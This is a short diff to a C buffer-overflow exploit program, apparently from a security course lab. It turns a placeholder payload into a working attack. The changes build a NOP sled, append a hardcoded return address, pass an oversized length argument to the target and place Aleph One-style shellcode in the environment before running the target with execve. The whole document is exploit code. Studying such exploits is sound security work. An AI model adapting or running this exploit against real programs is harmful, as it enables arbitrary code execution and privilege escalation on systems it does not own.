@@ -23,12 +23,13 @@ int main(void)
   char *args[4]; 
   char *env[1];
 
-  char *noop = "A";
-  int sled_length = 300;
-  char *result = malloc(sizeof(noop)*sled_length + 2);
+  char *noop = "\x90";
+  int sled_length = 400;
+  char *result = malloc(sizeof(noop)*sled_length + 17);
   char *result1 = repeat(noop, sled_length);
   strcat(result, result1);
-  strcat(result, "\x00");
+  strcat(result, "\x90\x90\x90\x90");
+  strcat(result, "\x0d\xfe\xff\xbf");
 
   char *preface = "shellcode=";
   char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
@@ -37,10 +38,10 @@ int main(void)
   
   args[0] = TARGET;
   args[1] = result;
-  args[2] = "399";
+  args[2] = "65935";
   args[3] = NULL;
   
-  env[0] = NULL;
+  env[0] = envvar;
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
